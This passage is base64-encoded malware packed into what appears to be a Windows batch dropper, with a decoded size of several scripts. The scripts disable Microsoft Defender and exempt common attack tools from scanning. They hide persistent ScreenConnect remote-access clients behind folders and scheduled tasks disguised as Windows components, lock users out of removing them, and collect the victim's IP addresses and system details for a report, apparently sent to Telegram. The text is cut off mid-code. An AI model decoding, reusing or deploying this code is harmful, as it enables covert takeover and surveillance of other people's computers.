SSAiJU5FV1NUQVRFJSI9PSJGQUlMIiBnb3RvIDpNYXliZVN1cHByZXNzCmdvdG8gOlNlbmRBbGVy
dAo6TWF5YmVTdXBwcmVzcwppZiAvSSAiJU5FV1NUQVRFJSI9PSIlT0xEU1RBVEUlIiBpZiBleGlz
dCAiJVdEJVx0Z19zZW50LmZsYWciICgKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
YWN0aXZlIC1Db21tYW5kICJpZigoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVy
YWxQYXRoICclV0QlXHRnX3NlbnQuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFsTWludXRlcyAt
bHQgMzApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4mMQogIGlmIG5vdCBlcnJvcmxldmVs
IDEgKAogICAgZWNobyB0Z19zdXBwcmVzc2VkXyVORVdTVEFURSU+PiIlTE9HJSIKICAgIGV4aXQg
L2IgMAogICkKKQo6U2VuZEFsZXJ0CmVjaG8gJU5FV1NUQVRFJT4iJVNUQVRFJSIKZWNobyBzZW50
PiIlV0QlXHRnX3NlbnQuZmxhZyIKcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2
ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAtU3Rh
dGUgJU5FV1NUQVRFJSAtU3VtbWFyeSAiJU1TRyUiIC1CdWlsZCAlTU9OVkVSJSAtQ291bnQgJUNP
VU5UJSA+bnVsIDI+JjEKZWNobyB0ZyBzdGF0ZSAlTkVXU1RBVEUlIHNlbnQ+PiIlTE9HJSIKZXhp
dCAvYiAwCg==
::B64_MON_END
::B64_SEC_BEGIN
QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwMlM1IC0gaWRlbnRpdHktYXdh
cmUgdGFzayBBQ0wgKyBEaXNhYmxlTVNJIG5ldXRyYWxpemUgKyBleGNsdXNpb25zL0FDTDsgbm8g
YXR0ci1sb2NrIG9uIG11dGFibGUgcGF5bG9hZHMNCnNldGxvY2FsIEVuYWJsZUV4dGVuc2lvbnMg
RW5hYmxlRGVsYXllZEV4cGFuc2lvbg0Kc2V0ICJXRD0lUHJvZ3JhbURhdGElXE1pY3Jvc29mdFxX
aW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0Kc2V0ICJXRDI9JVByb2dyYW1EYXRhJVxNaWNyb3Nv
ZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZSINCnNldCAiTE9HPSVXRCVcYm9vdC5lcnIiDQpz
ZXQgIlBSSU09U2NyZWVuQ29ubmVjdCBDbGllbnQgKDVmNjAxMDU3OTg1MmU1MDcpIg0Kc2V0ICJB
TFQ9U2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpIg0Kc2V0ICJLRUVQMT01
ZjYwMTA1Nzk4NTJlNTA3Ig0Kc2V0ICJLRUVQMj1mODYxYzgxNDBkNDUzNDI3Ig0Kc2V0ICJQRj0l
UHJvZ3JhbUZpbGVzJSINCnNldCAiUEY4Nj0lUHJvZ3JhbUZpbGVzKHg4NiklIg0Kc2V0ICJUQVNL
Uk9PVD0lU3lzdGVtUm9vdCVcU3lzdGVtMzJcVGFza3MiDQoNCmlmIG5vdCBleGlzdCAiJVdEJSIg
bWtkaXIgIiVXRCUiID5udWwgMj4mMQ0KaWYgbm90IGV4aXN0ICIlV0QyJSIgbWtkaXIgIiVXRDIl
IiA+bnVsIDI+JjENCmVjaG8gc2VjdXJlX2JlZ2luICVEQVRFJSAlVElNRSUgUzQ+PiIlTE9HJSIN
Cg0KUkVNIC0tLSBwZXItaG9zdCBpZGVudGl0eTogd2hpY2ggdGFzayBYTUxzIGJlbG9uZyB0byB1
cyAtLS0NCnNldCAiVEFTS1NfTElTVD1NaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU2NoZWR1
bGVkIE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIgTWljcm9zb2Z0XFdpbmRvd3NcV0RJXFJl
c29sdXRpb25Ib3N0IE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MSIN
CmlmIGV4aXN0ICIlV0QlXGlkZW50aXR5LmNmZyIgKA0KICBzZXQgIlRBU0tTX0xJU1Q9Ig0KICBm
b3IgL2YgInVzZWJhY2txIHRva2Vucz0xLDIgZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcaWRlbnRp
dHkuY2ZnIikgZG8gKA0KICAgIHNldCAiSz0lJUsiDQogICAgc2V0ICJWPSUlViINCiAgICBpZiAi
IUs6fjAsNSEiPT0iVEFTS18iIHNldCAiVEFTS1NfTElTVD0hVEFTS1NfTElTVCEgIVY6fjEhIg0K
ICApDQopDQoNClJFTSAtLS0gTmV1dHJhbGl6ZSBNU0kgYmxvY2sgcG9saWNpZXMgKDE2MjUpIC0t
LQ0KUkVNIERpc2FibGVNU0k6IDA9YWxsb3csIDE9bm9uLWFkbWluIG9ubHksIDI9YWxsIC0+IGZv
cmNlIDANCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3Nc
SW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0K
cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxs
ZXIiIC92IEFsd2F5c0luc3RhbGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+
JjENCnJlZyBkZWxldGUgIkhLQ1VcU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3Nc
SW5zdGFsbGVyIiAvdiBEaXNhYmxlTVNJIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtDVVxTT0ZU
V0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIiIC92IEFsd2F5c0luc3Rh
bGxFbGV2YXRlZCAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCg0KUkVNIC0tLSBEZWZl
bmRlcjogcmVnaXN0cnkgZXhjbHVzaW9ucyAocG9saWN5ICsgcHJlZmVyZW5jZSBrZXlzKSAtLS0N
CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5k
ZXIiIC92IERpc2FibGVBbnRpU3B5d2FyZSAvdCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjEN
CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5k
ZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgL3Qg
UkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGlj
aWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uIiAvdiBE
aXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0K
cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
clxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZUlPQVZQcm90ZWN0aW9uIC90IFJFR19E
V09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xN
aWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJs
ZVNjcmlwdFNjYW5uaW5nIC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAi
SEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhz
IiAvdiAiJVdEJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92
ICIlV0QyJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICJD
OlxXaW5kb3dzXFRlbXAiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAi
SEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhz
IiAvdiAiJVRFTVAlIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhL
TE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIg
L3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQgL2Qg
MCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3Mg
RGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQg
KCVLRUVQMiUpIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1c
U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3Yg
IiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiIC90IFJFR19EV09SRCAvZCAw
IC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBE
ZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUDIlKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpmb3IgJSVQIGluICht
c2lleGVjLmV4ZSBjdXJsLmV4ZSBjbWQuZXhlIHBvd2Vyc2hlbGwuZXhlIGNlcnR1dGlsLmV4ZSBT
Y3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlIFNjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVu
dC5leGUpIGRvICgNCiAgcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBE
ZWZlbmRlclxFeGNsdXNpb25zXFByb2Nlc3NlcyIgL3YgIiUlUCIgL3QgUkVHX0RXT1JEIC9kIDAg
L2YgPm51bCAyPiYxDQopDQoNClJFTSAtLS0gRGVmZW5kZXI6IGxpdmUgTXBQcmVmZXJlbmNlIChz
dHJvbmdlciB0aGFuIHJlZyBhbG9uZSkgLS0tDQpwb3dlcnNoZWxsLmV4ZSAtTm9Qcm9maWxlIC1O
b25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCBeDQogICIkRXJy
b3JBY3Rpb25QcmVmZXJlbmNlPSdTaWxlbnRseUNvbnRpbnVlJzsiIF4NCiAgIlRyeXtTZXQtTXBQ
cmVmZXJlbmNlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlOyBTZXQtTXBQcmVmZXJl
bmNlIC1EaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nICR0cnVlOyBTZXQtTXBQcmVmZXJlbmNlIC1E
aXNhYmxlSU9BVlByb3RlY3Rpb24gJHRydWU7IFNldC1NcFByZWZlcmVuY2UgLURpc2FibGVTY3Jp
cHRTY2FubmluZyAkdHJ1ZX1DYXRjaHt9OyIgXg0KICAiJHBhdGhzPUAoJyVXRCUnLCclV0QyJScs
J0M6XFdpbmRvd3NcVGVtcCcsJGVudjpURU1QLCclUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
S0VFUDElKScsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpJywnJVBGODYlXFNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKScsJyVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVu
dCAoJUtFRVAyJSknKTsiIF4NCiAgInRyeXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAk
ZW52OlByb2dyYW1GaWxlcyAtRmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY3Rv
cnkgLUVBIDAgfCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX1jYXRjaHt9OyIgXg0KICAi
dHJ5eyRwZjg2PVtFbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoJ1Byb2dyYW1GaWxlc1g4Nicp
OyBpZigkcGY4Nil7JHBhdGhzKz1AKEdldC1DaGlsZEl0ZW0gLVBhdGggJHBmODYgLUZpbHRlciAn
U2NyZWVuQ29ubmVjdCBDbGllbnQqJyAtRGlyZWN0b3J5IC1FQSAwIHwgRm9yRWFjaC1PYmplY3Qg
eyRfLkZ1bGxOYW1lfSl9fWNhdGNoe307IiBeDQogICJmb3JlYWNoKCRwIGluICgkcGF0aHMgfCBT
ZWxlY3QtT2JqZWN0IC1VbmlxdWUpKXsgaWYoJHAgLWFuZCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0
aCAkcCkpeyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRwIC1FQSAwIH0gfTsiIF4N
CiAgImZvcmVhY2goJHggaW4gQCgnbXNpZXhlYy5leGUnLCdjdXJsLmV4ZScsJ2NtZC5leGUnLCdw
b3dlcnNoZWxsLmV4ZScsJ2NlcnR1dGlsLmV4ZScsJ1NjcmVlbkNvbm5lY3QuQ2xpZW50U2Vydmlj
ZS5leGUnLCdTY3JlZW5Db25uZWN0LldpbmRvd3NDbGllbnQuZXhlJykpeyBBZGQtTXBQcmVmZXJl
bmNlIC1FeGNsdXNpb25Qcm9jZXNzICR4IC1FQSAwIH07IiBeDQogICJBZGQtTXBQcmVmZXJlbmNl
IC1FeGNsdXNpb25FeHRlbnNpb24gJy5jbWQnLCcucHMxJywnLm1zaScgLUVBIDAiID5udWwgMj4m
MQ0KDQpSRU0gLS0tIEFDTDogb25seSBTWVNURU0gKyBBZG1pbmlzdHJhdG9ycyBvbiBwZXJzaXN0
IGRpcnMgLS0tDQpjYWxsIDpMb2NrRGlyICIlV0QlIg0KY2FsbCA6TG9ja0RpciAiJVdEMiUiDQoN
ClJFTSAtLS0gaGlkZSB3b3JrZGlycyArIGtleSBwYXlsb2FkIGZpbGVzIC0tLQ0KYXR0cmliICto
ICtzICIlV0QlIiA+bnVsIDI+JjENCmF0dHJpYiAraCArcyAiJVdEMiUiID5udWwgMj4mMQ0KUkVN
IFM1OiBkbyBOT1QgaGlkZS9sb2NrIHRoZSBtdXRhYmxlIHBheWxvYWQgc2NyaXB0cyAtIGNvcHkv
bW92ZSBvdmVyICtoICtzIGZpbGVzDQpSRU0gZmFpbHMgc2lsZW50bHkgYW5kIGZyb3plIHRoZSB3
aG9sZSBmbGVldCdzIHNlbGYtdXBkYXRlLiBIaWRkZW4gZGlycyBjb25jZWFsIGNvbnRlbnRzIGFs
cmVhZHkuDQpmb3IgJSVGIGluIChwa2cubXNpIG5vdGlmeS5jZmcgaWRlbnRpdHkuY2ZnIHN0YXRl
Lmpzb24pIGRvICgNCiAgaWYgZXhpc3QgIiVXRCVcJSVGIiBhdHRyaWIgK2ggK3MgIiVXRCVcJSVG
IiA+bnVsIDI+JjENCikNCg0KUkVNIC0tLSBBQ0w6IHNjaGVkdWxlZCB0YXNrIFhNTCAoaGFyZGVy
IHRvIGRlbGV0ZSB3aXRob3V0IEFkbWluKSAtLS0NCmZvciAlJVQgaW4gKCVUQVNLU19MSVNUJSkg
ZG8gKA0KICBpZiBleGlzdCAiJVRBU0tST09UJVwlJX5UIiAoDQogICAgaWNhY2xzICIlVEFTS1JP
T1QlXCUlflQiIC9pbmhlcml0YW5jZTpyID5udWwgMj4mMQ0KICAgIGljYWNscyAiJVRBU0tST09U
JVwlJX5UIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZXFNZU1RFTTpGIiAiQlVJTFRJTlxBZG1pbmlz
dHJhdG9yczpGIiA+bnVsIDI+JjENCiAgICBhdHRyaWIgK2ggK3MgIiVUQVNLUk9PVCVcJSV+VCIg
Pm51bCAyPiYxDQogICkNCikNCg0KUkVNIC0tLSBBQ0w6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRp
b24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9vdCVcU3lzdGVtMzJcd2Jl
bVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06RiIgPm51bCAyPiYxDQoN
ClJFTSAtLS0gQUNMOiBrZWVwIFNjcmVlbkNvbm5lY3QgaW5zdGFsbCBkaXJzIChvbmNlOyB0YWtl
b3duIGV2ZXJ5IHRpY2sgaXMgbm9pc3kpIC0tLQ0KaWYgbm90IGV4aXN0ICIlV0QlXHNlY3VyZV9z
Yy5mbGFnIiAoDQogIGZvciAlJUQgaW4gKA0KICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglS0VFUDElKSINCiAgICAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQog
ICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiDQogICAgIiVQRjg2JVxT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICkgZG8gKA0KICAgIGlmIGV4aXN0ICIl
JX5EIiBjYWxsIDpMb2NrRGlyICIlJX5EIg0KICApDQogIGVjaG8gc2NfbG9ja2VkPiVXRCVcc2Vj
dXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25maWcv
c3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZWQgLS0tDQpSRU0gU1k6IENDIERDIExD
IFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4gY2Fubm90IGNoYW5nZSB0aGlzIFNEIGl0c2VsZikN
CnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSUkM7OztTWSkoQTs7Q0NEQ0xDU1dSUFdQ
RFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2RzZXQgIiVQUklNJSIgIiVTRCUiID5udWwg
Mj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZp
ZyAiJVBSSU0lIiBzdGFydD0gYXV0byA+bnVsIDI+JjENCnNjLmV4ZSBjb25maWcgIiVBTFQlIiBz
dGFydD0gYXV0byA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlUFJJTSUiIHJlc2V0PSA4NjQw
MCBhY3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVs
IDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlQUxUJSIgcmVzZXQ9IDg2NDAwIGFjdGlvbnM9IHJlc3Rh
cnQvNjAwMDAvcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwID5udWwgMj4mMQ0KDQplY2hvIHNl
Y3VyZV9kb25lPj4iJUxPRyUiDQpleGl0IC9iIDANCg0KOkxvY2tEaXINCnNldCAiVD0lfjEiDQpp
ZiBub3QgZXhpc3QgIiVUJSIgZXhpdCAvYiAwDQpSRU0gdGFrZSBvd25lcnNoaXAgdGhlbiBzdHJp
cCBpbmhlcml0ZWQgQUNFczsgU1lTVEVNK0FkbWlucyBvbmx5DQp0YWtlb3duIC9GICIlVCUiIC9S
IC9EIFkgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL2luaGVyaXRhbmNlOnIgPm51bCAyPiYxDQpp
Y2FjbHMgIiVUJSIgL2dyYW50OnIgIk5UIEFVVEhPUklUWVxTWVNURU06KE9JKShDSSlGIiAiQlVJ
TFRJTlxBZG1pbmlzdHJhdG9yczooT0kpKENJKUYiID5udWwgMj4mMQ0KaWNhY2xzICIlVCUiIC9y
ZW1vdmU6ZyAiVXNlcnMiICJBdXRoZW50aWNhdGVkIFVzZXJzIiAiRXZlcnlvbmUiICJOVCBBVVRI
T1JJVFlcSU5URVJBQ1RJVkUiICJCVUlMVElOXFVzZXJzIiA+bnVsIDI+JjENCmV4aXQgL2IgMA0K
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4MDJUOCAtIGlk
ZW50aXR5LWF3YXJlIHRhc2tzICsgY29tcGFjdCBkaWdlc3QgbW9kZTsgLUZvcmNlIG9uIGhpZGRl
biBjYWNoZQ0KcGFyYW0oDQogICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldW3N0cmlu
Z10kU3RhdGUsDQogICAgW3N0cmluZ10kU3VtbWFyeSA9ICcnLA0KICAgIFtzdHJpbmddJFdvcmtE
aXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUn
LA0KICAgIFtzdHJpbmddJE9sZFN0YXRlID0gJycsDQogICAgW1ZhbGlkYXRlU2V0KCdyaWNoJywg
J2NvbXBhY3QnKV1bc3RyaW5nXSRNb2RlID0gJ3JpY2gnLA0KICAgIFtzdHJpbmddJEJ1aWxkID0g
J08xNScsDQogICAgW3N0cmluZ10kQ291bnQgPSAnMCcNCikNCg0KJEVycm9yQWN0aW9uUHJlZmVy
ZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJw0KJFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRs
eUNvbnRpbnVlJw0KdHJ5IHsgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90
b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMiB9IGNhdGNoIHt9DQoNCmZ1
bmN0aW9uIEdldC1DZmcgew0KICAgICRwYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdub3RpZnku
Y2ZnJw0KICAgICRjZmcgPSBAe30NCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRwYXRoKSkgeyBy
ZXR1cm4gJGNmZyB9DQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwYXRoIHwgRm9yRWFj
aC1PYmplY3Qgew0KICAgICAgICBpZiAoJF8gLW1hdGNoICdeXHMqKFtBLVphLXowLTlfXSspXHMq
PVxzKiguKilccyokJykgew0KICAgICAgICAgICAgJGNmZ1skbWF0Y2hlc1sxXV0gPSAkbWF0Y2hl
c1syXS5UcmltKCkNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGNmZw0KfQ0KDQpmdW5j
dGlvbiBFc2MoW3N0cmluZ10kcykgew0KICAgIGlmICgkbnVsbCAtZXEgJHMpIHsgcmV0dXJuICcn
IH0NCiAgICByZXR1cm4gKCRzIC1yZXBsYWNlICcmJywgJyZhbXA7JyAtcmVwbGFjZSAnPCcsICcm
bHQ7JyAtcmVwbGFjZSAnPicsICcmZ3Q7JykNCn0NCg0KZnVuY3Rpb24gR2V0LVB1YmxpY0lwIHsN
CiAgICBmb3JlYWNoICgkdSBpbiBAKA0KICAgICAgICAgICAgJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9y
ZycsDQogICAgICAgICAgICAnaHR0cHM6Ly9pZmNvbmZpZy5tZS9pcCcsDQogICAgICAgICAgICAn
aHR0cHM6Ly9pY2FuaGF6aXAuY29tJw0KICAgICAgICApKSB7DQogICAgICAgIHRyeSB7DQogICAg
ICAgICAgICAkciA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHUgLVVzZUJhc2ljUGFyc2luZyAt
VGltZW91dFNlYyA2DQogICAgICAgICAgICAkaXAgPSAoJHIuQ29udGVudCB8IE91dC1TdHJpbmcp
LlRyaW0oKQ0KICAgICAgICAgICAgaWYgKCRpcCAtbWF0Y2ggJ15cZHsxLDN9KFwuXGR7MSwzfSl7
M30kJyAtb3IgJGlwIC1tYXRjaCAnOicpIHsgcmV0dXJuICRpcCB9DQogICAgICAgIH0gY2F0Y2gg
e30NCiAgICB9DQogICAgcmV0dXJuICduL2EnDQp9DQoNCmZ1bmN0aW9uIEdldC1Mb2NhbElwcyB7
DQogICAgdHJ5IHsNCiAgICAgICAgJGlwcyA9IEdldC1OZXRJUEFkZHJlc3MgLUFkZHJlc3NGYW1p
bHkgSVB2NCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVy
ZS1PYmplY3QgeyAkXy5JUEFkZHJlc3MgLW5vdGxpa2UgJzEyNy4qJyAtYW5kICRfLlByZWZpeE9y
aWdpbiAtbmUgJ1dlbGxLbm93bicgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1FeHBh
bmRQcm9wZXJ0eSBJUEFkZHJlc3MgLVVuaXF1ZQ0KICAgICAgICBpZiAoJGlwcykgeyByZXR1cm4g
KCRpcHMgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAk
aXBzID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiAt
RmlsdGVyICdJUEVuYWJsZWQ9VHJ1ZScgfA0KICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyAk
Xy5JUEFkZHJlc3MgfSB8IFdoZXJlLU9iamVjdCB7ICRfIC1hbmQgJF8gLW5vdGxpa2UgJzEyNy4q
JyAtYW5kICRfIC1ub3RsaWtlICcqOionIH0NCiAgICAgICAgaWYgKCRpcHMpIHsgcmV0dXJuICgo
JGlwcyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkgLWpvaW4gJywgJykgfQ0KICAgIH0gY2F0Y2gg
e30NCiAgICByZXR1cm4gJ24vYScNCn0NCg0KZnVuY3Rpb24gR2V0LU9zSW5mbyB7DQogICAgJG8g
PSBbb3JkZXJlZF1Aew0KICAgICAgICBDYXB0aW9uID0gJ24vYSc7IFZlcnNpb24gPSAnbi9hJzsg
QnVpbGQgPSAnbi9hJzsgQXJjaCA9ICduL2EnDQogICAgICAgIERvbWFpbiA9ICduL2EnOyBJbnN0
YWxsRGF0ZSA9ICduL2EnOyBMYXN0Qm9vdCA9ICduL2EnDQogICAgICAgIENQVSA9ICduL2EnOyBN
YW51ZmFjdHVyZXIgPSAnbi9hJzsgTW9kZWwgPSAnbi9hJzsgU2VyaWFsID0gJ24vYScNCiAgICAg
ICAgVG90YWxSQU1fR0IgPSAnbi9hJzsgRGlza0ZyZWVfR0IgPSAnbi9hJzsgRGlza1NpemVfR0Ig
PSAnbi9hJw0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICAkb3MgPSBHZXQtQ2ltSW5zdGFuY2Ug
V2luMzJfT3BlcmF0aW5nU3lzdGVtDQogICAgICAgICRvLkNhcHRpb24gPSAkb3MuQ2FwdGlvbg0K
ICAgICAgICAkby5WZXJzaW9uID0gJG9zLlZlcnNpb24NCiAgICAgICAgJG8uQnVpbGQgPSAkb3Mu
QnVpbGROdW1iZXINCiAgICAgICAgJG8uQXJjaCA9ICRvcy5PU0FyY2hpdGVjdHVyZQ0KICAgICAg
ICAkby5JbnN0YWxsRGF0ZSA9ICgkb3MuSW5zdGFsbERhdGUgfCBHZXQtRGF0ZSAtRm9ybWF0ICd5
eXl5LU1NLWRkJykNCiAgICAgICAgJG8uTGFzdEJvb3QgPSAoJG9zLkxhc3RCb290VXBUaW1lIHwg
R2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbScpDQogICAgICAgICRvLlRvdGFsUkFN
X0dCID0gW21hdGhdOjpSb3VuZCgkb3MuVG90YWxWaXNpYmxlTWVtb3J5U2l6ZSAvIDFNQiwgMSkN
CiAgICB9IGNhdGNoIHt9DQogICAgdHJ5IHsNCiAgICAgICAgJGNzID0gR2V0LUNpbUluc3RhbmNl
